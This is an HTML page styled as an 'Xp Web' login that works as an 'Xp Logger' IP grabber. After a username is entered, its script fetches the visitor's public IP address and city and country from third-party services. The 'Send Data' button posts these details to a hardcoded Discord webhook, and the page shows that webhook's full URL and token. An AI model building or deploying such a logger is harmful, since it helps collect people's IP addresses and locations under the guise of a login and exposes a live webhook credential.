<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Xp Logger</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" xintegrity="sha512-9usAa10IRO0HhonpyAIVpjrylPvoDwiPUiKdWk5t3PyolY1cOd4DSE0Ga+ri4AuTroPR5aQvXU9xC6qOPnzFeg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <style>
        body {
            font-family: 'Inter', sans-serif;
            background-color: #111827; 
            color: #f9fafb; 
            overflow: hidden;
        }
        .container {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.06), rgba(255, 255, 255, 0.02)); 
            border-radius: 1.5rem;
            box-shadow: 0 1.25rem 2.5rem rgba(0, 0, 0, 0.4); 
            padding: 3rem; 
            backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.04); 
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .container:hover {
            transform: translateY(-6px); 
            box-shadow: 0 1.5rem 3rem rgba(0, 0, 0, 0.5);
        }
        .heading {
            color: #f43f5e; 
            text-shadow: 0 0.15rem 0.3rem rgba(0, 0, 0, 0.7);
            font-size: 3rem;
            margin-bottom: 2.5rem; 
            animation: fadeIn 1s ease, pulse 2s infinite alternate;
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes pulse {
            from { transform: scale(1); }
            to { transform: scale(1.04); }
        }
        .login-section h2 {
            color: #cbd5e0; 
            font-size: 1.875rem; 
            margin-bottom: 2rem;
            text-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.5);
        }
        .login-section input {
            background-color: rgba(255, 255, 255, 0.08);
            border: 1px solid rgba(255, 255, 255, 0.04); 
            color: #ffffff;
            border-radius: 0.75rem;
            padding: 1.25rem; 
            margin-bottom: 2rem; 
            width: 100%;
            transition: all 0.3s ease;
            outline: none;
            font-size: 1.125rem; 
            box-shadow: inset 0 0.125rem 0.25rem rgba(0, 0, 0, 0.1);
        }
        .login-section input:focus {
            border-color: #f43f5e; 
            box-shadow: 0 0 0 4px rgba(244, 63, 94, 0.2), inset 0 0.125rem 0.25rem rgba(0, 0, 0, 0.1);
            background-color: rgba(255, 255, 255, 0.15); 
            transform: translateY(-3px); 
        }
        .login-section button {
            background: linear-gradient(to right, #f43f5e, #e02424); 
            color: #fff;
            padding: 1.25rem 2.5rem; 
            border-radius: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            width: 100%;
            border: none;
            box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.4); 
            font-size: 1.25rem; 
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-section button:hover {
            background: linear-gradient(to right, #d91e36, #c81e2e); 
            transform: translateY(-4px);
            box-shadow: 0 0.75rem 1.25rem rgba(0, 0, 0, 0.5); 
        }
        .login-section button:focus {
            outline: none;
            box-shadow: 0 0 0 4px rgba(244, 63, 94, 0.3);
        }
        .welcome-section h2 {
            color: #f43f5e; 
            font-size: 2.25rem;
            margin-bottom: 2rem;
            text-shadow: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.5);
            animation: fadeIn 1s ease, pulse 2s infinite alternate;
        }
        .welcome-section {
            color: #ffffff;
        }
        .info-box {
            background-color: rgba(255, 255, 255, 0.06); 
            padding: 2rem;
            border-radius: 1rem;
            margin-bottom: 2rem;
            border: 1px solid rgba(255, 255, 255, 0.04);
            backdrop-filter: blur(12px);
            transition: all 0.3s ease;
            box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.2);
        }
        .info-box:hover {
            transform: translateY(-3px);
            box-shadow: 0 0.75rem 1.25rem rgba(0, 0, 0, 0.3); 
        }
        .info-box p {
            color: #ffffff;
            font-weight: 600;
            margin-bottom: 1rem;
            font-size: 1.25rem; 
            text-shadow: 0 0.0625rem 0.125rem rgba(0, 0, 0, 0.4);
        }
        .info-box div {
            font-family: 'Mono', monospace;
            color: #ffffff;
            background-color: rgba(0, 0, 0, 0.15);
            padding: 1rem; 
            border-radius: 0.5rem;
            overflow-x: auto;
            font-size: 1.125rem; 
            box-shadow: inset 0 0.125rem 0.25rem rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.02); 
            margin-bottom: 0;
        }
        #login-error {
            color: #f43f5e;
            margin-top: 1.5rem;
            font-size: 1.125rem;
            font-weight: 600;
            animation: shake 0.5s ease-in-out, fadeIn 0.5s ease;
            text-shadow: 0 0.0625rem 0.125rem rgba(0, 0, 0, 0.5);
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-8px); }
            75% { transform: translateX(8px); }
        }
        .hidden {
            display: none;
        }
        #particles-canvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        .bottom-buttons {
            position: fixed;
            bottom: 3rem; 
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 1.5rem; 
            z-index: 10;
            justify-content: center; 
        }
        .bottom-button {
            background-color: rgba(255, 255, 255, 0.08); 
            color: #ffffff;
            padding: 1.25rem 2.5rem; 
            border-radius: 0.75rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 1px solid rgba(255, 255, 255, 0.04); 
            box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.2); 
            font-size: 1.25rem; 
            display: flex;
            align-items: center;
            justify-content: center;
            backdrop-filter: blur(12px);
        }
        .bottom-button:hover {
            background-color: rgba(255, 255, 255, 0.15); 
            transform: translateY(-4px);
            box-shadow: 0 0.75rem 1.25rem rgba(0, 0, 0, 0.3); 
        }
        .bottom-button i {
            margin-right: 0.75rem;
            font-size: 1.5rem;
        }
        .show-on-login {
            display: none;
        }
        .show-before-login {
            display: flex;
            justify-content: center; 
        }
    </style>
</head>
<body class="bg-gray-900 text-white">
    <canvas id="particles-canvas"></canvas>
    <div class="flex justify-center items-center min-h-screen">
        <div class="container w-full max-w-md">
            <h1 class="heading">Xp Web</h1> 
            <div id="login-section" class="login-section">
                <h2 class="text-xl font-semibold">Login</h2>
                <input type="text" id="username" placeholder="Username" class="focus:ring-2 focus:ring-blue-500">
                <button id="login-button">
                    <i class="fas fa-sign-in-alt mr-2"></i> Login
                </button>
                <div id="login-error" class="hidden"></div>
            </div>
            <div id="welcome-section" class="welcome-section hidden">
                <h2 class="text-xl font-semibold">Welcome, <span id="welcome-username" class="text-red-500"></span></h2>
                <div class="info-box">
                    <p>Your IP Address:</p>
                    <div id="ip-address" class="font-mono bg-black/20 rounded-md p-3 border border-white/5">Loading...</div>
                </div>
                <div class="info-box">
                    <p>Your General Location:</p>
                    <div id="location" class="font-mono bg-black/20 rounded-md p-3 border border-white/5">Loading...</div>
                </div>
                <div class="info-box">
                    <button id="send-data-button" class="login-section button">
                        <i class="fas fa-upload mr-2"></i> Send Data
                    </button>
                </div>
            </div>
        </div>
    </div>
    <div class="bottom-buttons show-before-login" id="bottom-buttons">
        <a href="https://discord.gg/QY6ZhCNzDD" target="_blank" rel="noopener noreferrer" class="bottom-button">
            <i class="fab fa-discord"></i> Discord
        </a>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
    <script>
        particlesJS('particles-canvas', {
            "particles": {
                "number": {
                    "value": 100,
                    "density": {
                        "enable": true,
                        "value_area": 800 
                    }
                },
                "color": {
                    "value": "#f43f5e" 
                },
                "shape": {
                    "type": "circle",
                    "stroke": {
                        "width": 0,
                        "color": "#000000"
                    },
                    "polygon": {
                        "nb_sides": 6 
                    },
                    "image": {
                        "src": "img/github.svg",
                        "width": 100,
                        "height": 100
                    }
                },
                "opacity": {
                    "value": 0.7,
                    "random": true,
                    "anim": {
                        "enable": true,
                        "speed": 0.8, 
                        "opacity_min": 0.1,
                        "sync": false
                    }
                },
                "size": {
                    "value": 4, 
                    "random": true,
                    "anim": {
                        "enable": true,
                        "speed": 1.7, 
                        "size_min": 1,
                        "sync": false
                    }
                },
                "line_linked": {
                    "enable": true,
                    "distance": 140, 
                    "color": "#f43f5e",
                    "opacity": 0.3, 
                    "width": 1.5 
                },
                "move": {
                    "enable": true,
                    "speed": 2.5, 
                    "direction": "none",
                    "random": true,
                    "straight": false,
                    "out_mode": "out",
                    "attract": {
                        "enable": false,
                        "rotateX": 600,
                        "rotateY": 1200
                    }
                }
            },
            "interactivity": {
                "detect_on": "canvas",
                "events": {
                    "onhover": {
                        "enable": true,
                        "mode": "grab"
                    },
                    "onclick": {
                        "enable": true,
                        "mode": "push"
                    },
                    "resize": true
                },
                "modes": {
                    "grab": {
                        "distance": 140, 
                        "line_linked": {
                            "opacity": 0.8 
                        }
                    },
                    "bubble": {
                        "distance": 200, 
                        "size": 8,
                        "duration": 0.4
                    },
                    "repulse": {
                        "distance": 200, 
                        "duration": 0.4
                    },
                    "push": {
                        "particles_nb": 6 
                    },
                    "remove": {
                        "particles_nb": 2
                    }
                }
            },
            "retina_detect": true
        });

        const loginSection = document.getElementById('login-section');
        const welcomeSection = document.getElementById('welcome-section');
        const usernameInput = document.getElementById('username');
        const loginButton = document.getElementById('login-button');
        const welcomeUsername = document.getElementById('welcome-username');
        const ipAddressDisplay = document.getElementById('ip-address');
        const locationDisplay = document.getElementById('location');
        const loginError = document.getElementById('login-error');
        const sendDataButton = document.getElementById('send-data-button');
        const bottomButtons = document.getElementById('bottom-buttons');

        const discordWebhookURL = 'https://discordapp.com/api/webhooks/1372645283057369159/04mkjML8mn2WqwJVr1BZa8jc66NVe8Es4tzAZOyS8romJqTBAVich4ELyGGYlDEUYgrV';

        async function sendDataToDiscord(username, ipAddress, location) {
            if (!discordWebhookURL) {
                console.warn('Discord Webhook URL is not configured. Data not sent.');
                return;
            }

            const message = {
                embeds: [
                    {
                        title: 'Xp Logger',
                        color: 15258703, 
                        fields: [
                            {
                                name: 'Username',
                                value: username,
                                inline: true
                            },
                            {
                                name: 'IP Address',
                                value: ipAddress,
                                inline: true
                            },
                            {
                                name: 'Location',
                                value: location,
                                inline: true
                            }
                        ],
                        timestamp: new Date()
                    }
                ]
            };

            try {
                const response = await fetch(discordWebhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    console.log('Data sent to Discord successfully.');
                } else {
                    console.error('Failed to send data to Discord:', response.status, response.statusText);
                }
            } catch (error) {
                console.error('Error sending data to Discord:', error);
            }
        }

        async function getIpAddressAndLocation() {
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ipAddress = ipData.ip;
                ipAddressDisplay.textContent = ipAddress;

                const locationResponse = await fetch(`https://ipapi.co/${ipAddress}/json/`);
                const locationData = await locationResponse.json();
                const city = locationData.city;
                const country = locationData.country_name;
                locationDisplay.textContent = `${city}, ${country}`;

                return { ipAddress, location: `${city}, ${country}`};
            } catch (error) {
                console.error('Error fetching IP address or location:', error);
                ipAddressDisplay.textContent = 'Error fetching IP';
                locationDisplay.textContent = 'Error fetching location';
                return null; 
            }
        }

        function handleLogin() {
            const username = usernameInput.value.trim();
            if (username === '') {
                loginError.textContent = 'Please enter a username.';
                loginError.classList.remove('hidden');
                return;
            }
            loginError.classList.add('hidden');
            welcomeUsername.textContent = username;
            loginSection.classList.add('hidden');
            welcomeSection.classList.remove('hidden');
            getIpAddressAndLocation();
            startMusic();
            bottomButtons.style.display = 'none';
        }

        loginButton.addEventListener('click', handleLogin);

        usernameInput.addEventListener('keypress', (event) => {
            if (event.key === 'Enter') {
                handleLogin();
            }
        });


        sendDataButton.addEventListener('click', () => {
            const username = usernameInput.value.trim();
            getIpAddressAndLocation().then(data => {
                if (data) {
                    sendDataToDiscord(username, data.ipAddress, data.location);
                }
            });
        });

        let audio;
        function startMusic() {
            if (!audio) {
                audio = new Audio('https://www.youtube.com/watch?v=qd-fzwFpXY0');
                audio.loop = true;
                audio.volume = 0.5;
                audio.play().catch(e => console.error("Playback prevented:", e));
            } else {
                audio.play().catch(e => console.error("Playback prevented:", e));
            }
        }

        function stopMusic() {
            if (audio) {
                audio.pause();
            }
        }
    </script>
</body>
</html>
